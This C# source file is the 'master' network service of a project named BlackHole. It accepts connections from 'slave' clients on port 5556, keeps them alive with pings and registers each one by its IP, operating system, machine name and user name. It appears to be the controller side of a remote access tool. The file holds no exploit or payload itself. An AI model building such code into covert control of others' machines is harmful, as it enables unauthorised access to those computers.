using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using NetMQ;
using NetMQ.Sockets;

namespace BlackHole.Master
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class NetworkService : Singleton<NetworkService>, IEventListener<SlaveEvent, Slave>
    {
        public const int SEND_INTERVAL = 10;
        public const int PING_INTERVAL = 1000;

        public const int PING_COUNT_BEFORE_DISCONNECTION = 5;
        
        private NetMQSocket m_server;
        private NetMQPoller m_poller;
        private Dictionary<int, Slave> m_slaveById;
        private bool m_started;
        private ConcurrentQueue<NetMQMessage> m_sendQueue = new ConcurrentQueue<NetMQMessage>();

        /// <summary>
        /// 
        /// </summary>
        public NetworkService()
        {
            m_slaveById = new Dictionary<int, Slave>();
            Slave.SlaveEvents.Subscribe(this);
        }

        /// <summary>
        /// 
        /// </summary>
        public void Start()
        {
            m_server = new RouterSocket();
            m_server.Bind("tcp://*:5556");
            m_server.ReceiveReady += Server_ReceiveReady;
            m_server.SendReady += Server_SendReady;

            var heartbeatTimer = new NetMQTimer(PING_INTERVAL);
            heartbeatTimer.Elapsed += Heartbeat;

            var sendTimer = new NetMQTimer(SEND_INTERVAL);
            sendTimer.Elapsed += SendQueue;

            m_poller = new NetMQPoller {m_server, heartbeatTimer, sendTimer};
            //m_poller.PollTimeout = 1;
            m_poller.RunAsync();
            m_started = true;
        }
        
        /// <summary>
        /// 
        /// </summary>
        public void Stop()
        {
            if (m_started)
            {
                m_poller.Dispose();
                m_server.Dispose();
                m_started = false;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        public bool Send(NetMQMessage message)
        {
            m_sendQueue.Enqueue(message);
            return true;
        }
    
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void SendQueue(object sender, NetMQTimerEventArgs e)
        {
            NetMQMessage message = null;
            var i = m_sendQueue.Count;
            while (i > 0)
            {
                if (m_sendQueue.TryDequeue(out message))
                    m_server.TrySendMultipartMessage(message);
                i--;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        private void Heartbeat(object sender, NetMQTimerEventArgs e)
        {
            foreach(var slave in m_slaveById.Values.ToArray())
            {
                slave.PingAndIncrementTimeout();
                if (slave.PingTimeout > PING_COUNT_BEFORE_DISCONNECTION)
                {
                    FireSlaveDisconnected(slave);
                } 
            }
        }
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        private void FireSlaveConnected(Slave slave)
        {
            Slave.PostEvent(new SlaveEvent(SlaveEventType.CONNECTED, slave));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        private void FireSlaveDisconnected(Slave slave)
        {
            m_slaveById.Remove(slave.Id);
            Slave.PostEvent(new SlaveEvent(SlaveEventType.DISCONNECTED, slave));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        /// <param name="message"></param>
        private void FireSlaveIncommingMessage(Slave slave, NetMessage message)
            => Slave.PostEvent(new SlaveEvent(SlaveEventType.INCOMMING_MESSAGE, slave, message));
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Server_SendReady(object sender, NetMQSocketEventArgs e)
        {
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Server_ReceiveReady(object sender, NetMQSocketEventArgs e)
        {
            NetMQMessage mqmessage = null;
            if (!e.Socket.TryReceiveMultipartMessage(ref mqmessage))
                return;

            var identity = mqmessage.First.Buffer;
            var clientId = BitConverter.ToInt32(identity, 1);
            var message = NetMessage.Deserialize(mqmessage.Last.Buffer);
            
            Slave slave = null;
            if (!m_slaveById.ContainsKey(clientId))            
                m_slaveById.Add(clientId, slave = new Slave(identity, clientId));            
            else
                slave = m_slaveById[clientId];

            FireSlaveIncommingMessage(slave, message);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public void OnEvent(SlaveEvent ev)
        {
            switch ((SlaveEventType)ev.EventType)
            {
                case SlaveEventType.INCOMMING_MESSAGE:
                    ev.Data
                        .Match()
                        .With<GreetTheMasterMessage>(m =>
                        {
                            if(ev.Source.Initialize(m.Ip, m.OperatingSystem, m.MachineName, m.UserName))
                                FireSlaveConnected(ev.Source);
                        })
                        .With<PongMessage>(m =>
                        {
                            ev.Source.DecrementPingTimeout();
                        });
                    break;
            }
        }
    }
}
